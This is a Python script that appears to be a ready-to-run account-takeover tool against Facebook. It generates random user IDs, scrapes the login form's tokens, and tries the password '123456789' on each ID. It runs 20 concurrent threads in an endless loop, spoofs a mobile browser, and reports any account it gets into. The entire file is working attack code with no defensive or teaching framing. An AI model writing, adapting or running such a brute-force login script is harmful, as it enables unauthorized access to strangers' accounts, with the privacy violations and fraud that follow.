import random
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Thread-safe print
print_lock = threading.Lock()

def generate_15_digit_userid():
    rest = ''.join(random.choices('0123456789', k=11))
    return '1000' + rest

def attempt_login():
    try:
        username = generate_15_digit_userid()
        login_url = "https://m.facebook.com/login.php"
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]',
            "Accept": "text/html,application/xhtml+xml,application/xml",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Referer": "https://m.facebook.com/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        response = session.get(login_url, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        lsd = soup.find("input", {"name": "lsd"})["value"]
        jazoest = soup.find("input", {"name": "jazoest"})["value"]
        payload = {
            "lsd": lsd,
            "jazoest": jazoest,
            "email": username,
            "pass": "123456789",
            "login": "Log In",
        }
        login_response = session.post(login_url, headers=headers, data=payload)
        cookies = session.cookies.get_dict()
        if "c_user" in cookies:
            with print_lock:
                print(f"✅ Login successful! User ID: {cookies.get('c_user')} ({username})")
        else:
            with print_lock:
                print(f"❌ Login failed for {username}")
    except Exception as e:
        with print_lock:
            print(f"⚠️ Error for attempt: {e}")

# Main loop
if __name__ == "__main__":
    max_workers = 20  # Adjust as needed
    while True:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(attempt_login) for _ in range(max_workers)]
            for future in as_completed(futures):
                future.result()